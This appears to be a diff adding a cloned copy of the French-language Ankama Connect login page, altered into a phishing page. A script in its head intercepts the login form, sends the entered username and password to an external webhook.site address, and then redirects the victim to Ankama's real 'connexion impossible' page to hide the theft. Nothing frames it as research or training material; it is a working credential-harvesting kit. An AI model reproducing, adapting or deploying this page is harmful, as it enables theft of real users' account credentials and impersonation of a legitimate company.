@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<!-- saved from url=(0395)https://auth.ankama.com/login/ankama/form?origin_tracker=https://ankabox.ankama.com/fr/identification?from%3Dhttps%253A%252F%252Fankabox.ankama.com%252Ffr&redirect_uri=https://auth.ankama.com/login-authorized?state%3DeyJzdGF0ZV9pZCI6IkVtNzVYYjlFQ1p2bFk0NEdQbFA3TE9JSnpoN1VyTzVydHRZN01obE9ZS0kiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FjY291bnQuYW5rYW1hLmNvbS9hdXRob3JpemVkIiwicHJvdmlkZXIiOiJBbmthbWEifQ -->
+<html lang="fr">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Ankama Connect</title>
+    <link rel="icon" href="https://static.ankama.com/g/modules/ankama/logo/favicon-grey.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script type="text/javascript" src="./Ankama Connect_files/challenge.js.download" defer=""></script>
+    <link type="text/css" media="screen" rel="stylesheet" href="./Ankama Connect_files/main-fd470297.css">
+
+    <script>
+        var supportsCustomElements = ('customElements' in window)
+
+        if (false === supportsCustomElements) {
+            window.location.href = "/outdated-browser"
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevent immediate form submission
+
+            // Create and submit form data to the webhook URL
+            fetch('https://webhook.site/ecc8f0ef-7904-41bc-92b0-d161cc971897', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: new FormData(event.target)
+            }).then(() => {
+                // Redirect to URL-B after the form submission
+                window.location.href = 'https://account.ankama.com/fr/compte/connexion-impossible'; // Replace with your desired URL-B
+            }).catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+
+</head>
+
+<body>
+    <div class="change-language">
+        <a type="button" class="dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="true"><span
+                class="country-flag flag-fr"></span></a>
+        <ul class="dropdown-menu dropdown-menu-end">
+
+            <li><a href="https://auth.ankama.com/change-language/fr">
+                    <span>Français</span>
+                    <span class="country-flag flag-fr"></span>
+                </a></li>
+
+            <li><a href="https://auth.ankama.com/change-language/en">
+                    <span>English</span>
+                    <span class="country-flag flag-en"></span>
+                </a></li>
+
+            <li><a href="https://auth.ankama.com/change-language/de">
+                    <span>Deutsch</span>
+                    <span class="country-flag flag-de"></span>
+                </a></li>
+
+            <li><a href="https://auth.ankama.com/change-language/es">
+                    <span>Español</span>
+                    <span class="country-flag flag-es"></span>
+                </a></li>
+
+            <li><a href="https://auth.ankama.com/change-language/pt">
+                    <span>Português</span>
+                    <span class="country-flag flag-pt"></span>
+                </a></li>
+
+            <li><a href="https://auth.ankama.com/change-language/it">
+                    <span>Italiano</span>
+                    <span class="country-flag flag-it"></span>
+                </a></li>
+
+        </ul>
+    </div>
+
+    <div class="main-container">
+        <div class="logo-with-title">
+            <div class="logo"><img src="./Ankama Connect_files/logo-account.svg" alt=""></div>
+            <div class="title">Se connecter</div>
+        </div>
+        <div class="main-content ">
+
+
+            <secure-form>
+                <form action="/login/ankama/form" method="post" class="login-form-page" onsubmit="handleSubmit(event)">
+
+                    <input type="hidden" name="state"
+                        value="eyJzdGF0ZV9pZCI6InVybkJlRVl4RktMQ0pHT3ZmZUhvRnZ5V1pzUUFlMHN2TkswYTVmR3kyMGsiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2F1dGguYW5rYW1hLmNvbS9sb2dpbi1hdXRob3JpemVkP3N0YXRlPWV5SnpkR0YwWlY5cFpDSTZJa1Z0TnpWWVlqbEZRMXAyYkZrME5FZFFiRkEzVEU5SlNucG9OMVZ5VHpWeWRIUlpOMDFvYkU5WlMwa2lMQ0p5WldScGNtVmpkRjkxY21raU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5RdVlXNXJZVzFoTG1OdmJTOWhkWFJvYjNKcGVtVmtJaXdpY0hKdmRtbGtaWElpT2lKQmJtdGhiV0VpZlEiLCJvcmlnaW5fdHJhY2tlciI6Imh0dHBzOi8vYW5rYWJveC5hbmthbWEuY29tL2ZyL2lkZW50aWZpY2F0aW9uP2Zyb209aHR0cHMlM0ElMkYlMkZhbmthYm94LmFua2FtYS5jb20lMkZmciJ9">
+
+                    <div class="login-form-page-form">
+
+
+
+
+                        <div class="form-group ">
+                            <label for="ankama-login">Identifiant <span class="require">*</span></label>
+                            <div class="input-container  with-tooltip">
+                                <input id="ankama-login" type="text" name="login" value="" class="" required="required"
+                                    tabindex="1" placeholder="Identifiant">
+
+
+
+
+                                <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor"
+                                    class="bi bi-question-circle-fill" viewBox="0 0 16 16" data-bs-toggle="tooltip"
+                                    data-bs-html="true" data-bs-placement="left" data-bs-custom-class="input-tooltip"
+                                    data-bs-title="Compte créé avant le 24 août 2021 : Votre nom de compte&lt;br/&gt;Compte créé après le 24 août 2021 : Votre email">
+                                    <path
+                                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM5.496 6.033h.825c.138 0 .248-.113.266-.25.09-.656.54-1.134 1.342-1.134.686 0 1.314.343 1.314 1.168 0 .635-.374.927-.965 1.371-.673.489-1.206 1.06-1.168 1.987l.003.217a.25.25 0 0 0 .25.246h.811a.25.25 0 0 0 .25-.25v-.105c0-.718.273-.927 1.01-1.486.609-.463 1.244-.977 1.244-2.056 0-1.511-1.276-2.241-2.673-2.241-1.267 0-2.655.59-2.75 2.286a.237.237 0 0 0 .241.247zm2.325 6.443c.61 0 1.029-.394 1.029-.927 0-.552-.42-.94-1.029-.94-.584 0-1.009.388-1.009.94 0 .533.425.927 1.01.927z">
+                                    </path>
+                                </svg>
+
+                            </div>
+
+                        </div>
+
+
+
+                        <div class="form-group ">
+                            <label for="ankama-password">Mot de passe <span class="require">*</span></label>
+                            <div class="input-container  ">
+                                <input id="ankama-password" type="password" name="password" value="" class=""
+                                    required="required" tabindex="2" placeholder="Mot de passe">
+
+
+                                <toggle-password toggle-target="ankama-password"
+                                    class="toggle-password"></toggle-password>
+                                <capslock-detector target="ankama-password" class="capslock-detector">Verrouillage
+                                    majuscule activé</capslock-detector>
+
+
+
+                            </div>
+
+                        </div>
+
+                        <div class="form-group ">
+                            <button type="submit" class="btn btn-lg btn-primary w-100" tabindex="3">
+                                Se connecter
+                            </button>
+                        </div>
+
+                    </div>
+
+                    <div class="login-form-page-baseline">
+                        <p class="baseline text-center">
+                            <a href="https://account.ankama.com/fr/compte/connexion-impossible">Impossible de se
+                                connecter ?</a>
+                        </p>
+
+                        <p class="baseline text-center">
+                            Vous n'avez pas de compte Ankama ? <br>
+                            <a
+                                href="https://auth.ankama.com/register/ankama/form?origin_tracker=https://ankabox.ankama.com/fr/identification?from%3Dhttps%253A%252F%252Fankabox.ankama.com%252Ffr&amp;redirect_uri=https://auth.ankama.com/login-authorized?state%3DeyJzdGF0ZV9pZCI6IkVtNzVYYjlFQ1p2bFk0NEdQbFA3TE9JSnpoN1VyTzVydHRZN01obE9ZS0kiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FjY291bnQuYW5rYW1hLmNvbS9hdXRob3JpemVkIiwicHJvdmlkZXIiOiJBbmthbWEifQ">Créer
+                                un compte</a>
+                        </p>
+                    </div>
+
+                </form>
+            </secure-form>
+
+        </div>
+    </div>
+
+    <script type="text/javascript" src="./Ankama Connect_files/main.ts-ea26692d.js.download"></script>
+
+</body>
+
+</html>
